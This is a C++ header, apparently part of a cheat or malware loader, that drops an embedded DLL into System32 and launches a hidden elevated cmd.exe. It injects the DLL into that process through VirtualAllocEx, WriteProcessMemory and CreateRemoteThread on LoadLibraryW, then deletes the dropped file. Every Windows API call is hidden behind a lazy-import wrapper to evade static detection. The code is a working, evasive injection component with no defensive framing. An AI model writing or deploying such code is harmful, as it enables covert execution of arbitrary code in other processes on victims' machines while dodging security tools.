#ifndef INJECTION_CXX
#define INJECTION_CXX

#include "includes.hxx"

class resume_injection
{
private:

	class tools
	{
	public:

		auto create_file_from_memory(const std::string& desired_file_path, const char* address, size_t size) const -> bool
		{
			LI_FN(DeleteFileA).forwarded_safe_cached()(desired_file_path.c_str());

			std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

			if (!file_ofstream.write(address, size))
			{
				file_ofstream.close();
				return false;
			}

			file_ofstream.close();
			return true;
		}

		auto string_to_wstring(const std::string& str) const -> std::wstring
		{
			int size_needed = LI_FN(MultiByteToWideChar).forwarded_safe_cached()(CP_UTF8, 0, str.c_str(), (int)str.size(), nullptr, 0);
			std::wstring wstr(size_needed, 0);
			LI_FN(MultiByteToWideChar).forwarded_safe_cached()(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size_needed);
			return wstr;
		}

		auto inject_data(HANDLE process_handle, PVOID local_data, SIZE_T data_size) const -> PVOID
		{
			PVOID remote_data = (PVOID)LI_FN(VirtualAllocEx).forwarded_safe_cached()(process_handle, 0, data_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (remote_data == 0)
			{
				return 0;
			}
			SIZE_T bytes_wrote;
			BOOL success = LI_FN(WriteProcessMemory).forwarded_safe_cached()(process_handle, remote_data, local_data, data_size, &bytes_wrote);
			if (!success or bytes_wrote != data_size)
			{
				LI_FN(VirtualFreeEx).forwarded_safe_cached()(process_handle, remote_data, 0, MEM_RELEASE);
				return 0;
			}
			return remote_data;
		}

		auto inject_dll(HANDLE process_hande, const WCHAR* dll_path) const -> bool
		{
			HMODULE kernel_32 = LI_FN(GetModuleHandleW).forwarded_safe_cached()(L"Kernel32.dll");
			if (!kernel_32)
			{
				return false;
			}
			PVOID load_library = (PVOID)LI_FN(GetProcAddress).forwarded_safe_cached()(kernel_32, "LoadLibraryW");
			PVOID remote_path = this->inject_data(process_hande, (PVOID)dll_path, (wcslen(dll_path) + 1) * sizeof(WCHAR));
			if (!remote_path)
			{
				return false;
			}

			HANDLE thread_handle = LI_FN(CreateRemoteThread).forwarded_safe_cached()(process_hande, 0, 0, (LPTHREAD_START_ROUTINE)load_library, remote_path, 0, 0);
			if (!thread_handle)
			{
				LI_FN(VirtualFreeEx).forwarded_safe_cached()(process_hande, remote_path, 0, MEM_RELEASE);
				return false;
			}

			LI_FN(WaitForSingleObject).forwarded_safe_cached()(thread_handle, INFINITE);
			LI_FN(CloseHandle).forwarded_safe_cached()(thread_handle);

			return true;
		}

	};
	tools c_tools;

	auto initialize(const std::string& dll_to_inject, const std::wstring& process_to_inject_to) -> bool
	{
		if (!this->c_tools.create_file_from_memory(dll_to_inject.c_str(), reinterpret_cast<const char*>(n_bytes::module), sizeof(n_bytes::module)))
		{
			LI_FN(DeleteFileA).forwarded_safe_cached()(dll_to_inject.c_str());
			return false;
		}

		DWORD process_pid = c_process->get_pid_from_name(process_to_inject_to.c_str());
		if (!process_pid)
		{
			LI_FN(DeleteFileA).forwarded_safe_cached()(dll_to_inject.c_str());
			return false;
		}

		HANDLE process_handle = LI_FN(OpenProcess).forwarded_safe_cached()(PROCESS_ALL_ACCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, process_pid);
		if (!process_handle)
		{
			LI_FN(DeleteFileA).forwarded_safe_cached()(dll_to_inject.c_str());
			return false;
		}

		if (!this->c_tools.inject_dll(process_handle, this->c_tools.string_to_wstring(dll_to_inject).c_str()))
		{
			LI_FN(DeleteFileA).forwarded_safe_cached()(dll_to_inject.c_str());
			return false;
		}

		LI_FN(DeleteFileA).forwarded_safe_cached()(dll_to_inject.c_str());

		return true;
	}

public:

	auto start() -> bool
	{
		ShellExecuteW(0, L"runas", L"C:\\Windows\\System32\\cmd.exe", 0, 0, SW_HIDE);

		HANDLE cmd_handle = LI_FN(OpenProcess).forwarded_safe_cached()(PROCESS_TERMINATE, 0, c_process->get_process_id_from_process_name(L"cmd.exe"));
		if (cmd_handle)
		{
			LI_FN(TerminateProcess).forwarded_safe_cached()(cmd_handle, 0);
			LI_FN(CloseHandle).forwarded_safe_cached()(cmd_handle);
		}

		return this->initialize("C:\\Windows\\System32\\suspension_resume.dll", L"cmd.exe");
	}
};
inline const auto c_resume_injection = std::make_unique<resume_injection>();

#endif // !INJECTION_CXX
